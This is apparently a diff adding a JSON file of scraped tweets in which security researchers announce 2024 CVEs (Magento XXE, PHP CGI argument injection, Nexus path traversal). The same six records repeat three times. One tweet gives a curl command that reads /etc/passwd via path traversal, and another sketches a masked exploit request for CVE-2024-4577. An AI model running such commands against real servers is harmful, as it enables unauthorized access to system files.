@@ -1,0 +1,198 @@
+{
+    "tweetfavorites": 227,
+    "tweetquotes": 2,
+    "tweetreplies": 3,
+    "tweetretweets": 37,
+    "tweettext": "CVE-2024-34102 Pre Auth XXE in magento https://t.co/ZxRCmgc2eu",
+    "tweettime": "2024-06-25, 16:14:33",
+    "tweeturl": "https://twitter.com/chybeta/status/1805635705303187718",
+    "username": "chybeta"
+}
+{
+    "tweetfavorites": 431,
+    "tweetquotes": 1,
+    "tweetreplies": 11,
+    "tweetretweets": 31,
+    "tweettext": "CVE-2024-28995 https://t.co/VsXVXWrvRy",
+    "tweettime": "2024-06-13, 10:16:19",
+    "tweeturl": "https://twitter.com/chybeta/status/1801196898692555138",
+    "username": "chybeta"
+}
+{
+    "expanded_url": [
+        "https://github.com/11whoami99/CVE-2024-4577/blob/88e8aa48f001d9538418783cb16179e5dfc59769/CVE-2024-4577.yaml"
+    ],
+    "tweetfavorites": 168,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 47,
+    "tweettext": "CVE-2024-4577 PHP CGI Argument Injection\n\nhttps://t.co/NYGKfQKM4a",
+    "tweettime": "2024-06-07, 13:58:48",
+    "tweeturl": "https://twitter.com/momika233/status/1799078561141375026",
+    "username": "momika233"
+}
+{
+    "tweetfavorites": 373,
+    "tweetquotes": 0,
+    "tweetreplies": 8,
+    "tweetretweets": 83,
+    "tweettext": "CVE-2024-4577 in  XAMPP with default Config \n\nPOST /php-cgi/xxxx  HTTP/1.1\nxxx: 1\n\nxxxx\"dir\"xxxx",
+    "tweettime": "2024-06-07, 09:17:29",
+    "tweeturl": "https://twitter.com/chybeta/status/1799007762594324826",
+    "username": "chybeta"
+}
+{
+    "tweetfavorites": 107,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 11,
+    "tweettext": "CVE-2024-29849 is neat :D https://t.co/8CRHiKlhYh",
+    "tweettime": "2024-06-07, 04:01:14",
+    "tweeturl": "https://twitter.com/steventseeley/status/1798928176774791368",
+    "username": "steventseeley"
+}
+{
+    "expanded_url": [
+        "https://everything.curl.dev/cmdline/variables.html"
+    ],
+    "tweetfavorites": 77,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 17,
+    "tweettext": "PSA: curl can do variables. Example using Nexus CVE-2024-4956:\n\ncurl -v --variable hax=////../../../../etc/passwd --expand-url http://127.0.0.2:8081/{{hax:url}}\n\nhttps://t.co/u0DR4P3hEJ",
+    "tweettime": "2024-06-03, 19:50:10",
+    "tweeturl": "https://twitter.com/wvuuuuuuuuuuuuu/status/1797717430338535509",
+    "username": "wvuuuuuuuuuuuuu"
+}
+{
+    "tweetfavorites": 227,
+    "tweetquotes": 2,
+    "tweetreplies": 3,
+    "tweetretweets": 37,
+    "tweettext": "CVE-2024-34102 Pre Auth XXE in magento https://t.co/ZxRCmgc2eu",
+    "tweettime": "2024-06-25, 16:14:33",
+    "tweeturl": "https://twitter.com/chybeta/status/1805635705303187718",
+    "username": "chybeta"
+}
+{
+    "tweetfavorites": 431,
+    "tweetquotes": 1,
+    "tweetreplies": 11,
+    "tweetretweets": 31,
+    "tweettext": "CVE-2024-28995 https://t.co/VsXVXWrvRy",
+    "tweettime": "2024-06-13, 10:16:19",
+    "tweeturl": "https://twitter.com/chybeta/status/1801196898692555138",
+    "username": "chybeta"
+}
+{
+    "expanded_url": [
+        "https://github.com/11whoami99/CVE-2024-4577/blob/88e8aa48f001d9538418783cb16179e5dfc59769/CVE-2024-4577.yaml"
+    ],
+    "tweetfavorites": 168,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 47,
+    "tweettext": "CVE-2024-4577 PHP CGI Argument Injection\n\nhttps://t.co/NYGKfQKM4a",
+    "tweettime": "2024-06-07, 13:58:48",
+    "tweeturl": "https://twitter.com/momika233/status/1799078561141375026",
+    "username": "momika233"
+}
+{
+    "tweetfavorites": 373,
+    "tweetquotes": 0,
+    "tweetreplies": 8,
+    "tweetretweets": 83,
+    "tweettext": "CVE-2024-4577 in  XAMPP with default Config \n\nPOST /php-cgi/xxxx  HTTP/1.1\nxxx: 1\n\nxxxx\"dir\"xxxx",
+    "tweettime": "2024-06-07, 09:17:29",
+    "tweeturl": "https://twitter.com/chybeta/status/1799007762594324826",
+    "username": "chybeta"
+}
+{
+    "tweetfavorites": 107,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 11,
+    "tweettext": "CVE-2024-29849 is neat :D https://t.co/8CRHiKlhYh",
+    "tweettime": "2024-06-07, 04:01:14",
+    "tweeturl": "https://twitter.com/steventseeley/status/1798928176774791368",
+    "username": "steventseeley"
+}
+{
+    "expanded_url": [
+        "https://everything.curl.dev/cmdline/variables.html"
+    ],
+    "tweetfavorites": 77,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 17,
+    "tweettext": "PSA: curl can do variables. Example using Nexus CVE-2024-4956:\n\ncurl -v --variable hax=////../../../../etc/passwd --expand-url http://127.0.0.2:8081/{{hax:url}}\n\nhttps://t.co/u0DR4P3hEJ",
+    "tweettime": "2024-06-03, 19:50:10",
+    "tweeturl": "https://twitter.com/wvuuuuuuuuuuuuu/status/1797717430338535509",
+    "username": "wvuuuuuuuuuuuuu"
+}
+{
+    "tweetfavorites": 227,
+    "tweetquotes": 2,
+    "tweetreplies": 3,
+    "tweetretweets": 37,
+    "tweettext": "CVE-2024-34102 Pre Auth XXE in magento https://t.co/ZxRCmgc2eu",
+    "tweettime": "2024-06-25, 16:14:33",
+    "tweeturl": "https://twitter.com/chybeta/status/1805635705303187718",
+    "username": "chybeta"
+}
+{
+    "tweetfavorites": 431,
+    "tweetquotes": 1,
+    "tweetreplies": 11,
+    "tweetretweets": 31,
+    "tweettext": "CVE-2024-28995 https://t.co/VsXVXWrvRy",
+    "tweettime": "2024-06-13, 10:16:19",
+    "tweeturl": "https://twitter.com/chybeta/status/1801196898692555138",
+    "username": "chybeta"
+}
+{
+    "expanded_url": [
+        "https://github.com/11whoami99/CVE-2024-4577/blob/88e8aa48f001d9538418783cb16179e5dfc59769/CVE-2024-4577.yaml"
+    ],
+    "tweetfavorites": 168,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 47,
+    "tweettext": "CVE-2024-4577 PHP CGI Argument Injection\n\nhttps://t.co/NYGKfQKM4a",
+    "tweettime": "2024-06-07, 13:58:48",
+    "tweeturl": "https://twitter.com/momika233/status/1799078561141375026",
+    "username": "momika233"
+}
+{
+    "tweetfavorites": 373,
+    "tweetquotes": 0,
+    "tweetreplies": 8,
+    "tweetretweets": 83,
+    "tweettext": "CVE-2024-4577 in  XAMPP with default Config \n\nPOST /php-cgi/xxxx  HTTP/1.1\nxxx: 1\n\nxxxx\"dir\"xxxx",
+    "tweettime": "2024-06-07, 09:17:29",
+    "tweeturl": "https://twitter.com/chybeta/status/1799007762594324826",
+    "username": "chybeta"
+}
+{
+    "tweetfavorites": 107,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 11,
+    "tweettext": "CVE-2024-29849 is neat :D https://t.co/8CRHiKlhYh",
+    "tweettime": "2024-06-07, 04:01:14",
+    "tweeturl": "https://twitter.com/steventseeley/status/1798928176774791368",
+    "username": "steventseeley"
+}
+{
+    "expanded_url": [
+        "https://everything.curl.dev/cmdline/variables.html"
+    ],
+    "tweetfavorites": 77,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 17,
+    "tweettext": "PSA: curl can do variables. Example using Nexus CVE-2024-4956:\n\ncurl -v --variable hax=////../../../../etc/passwd --expand-url http://127.0.0.2:8081/{{hax:url}}\n\nhttps://t.co/u0DR4P3hEJ",
+    "tweettime": "2024-06-03, 19:50:10",
+    "tweeturl": "https://twitter.com/wvuuuuuuuuuuuuu/status/1797717430338535509",
+    "username": "wvuuuuuuuuuuuuu"
+}
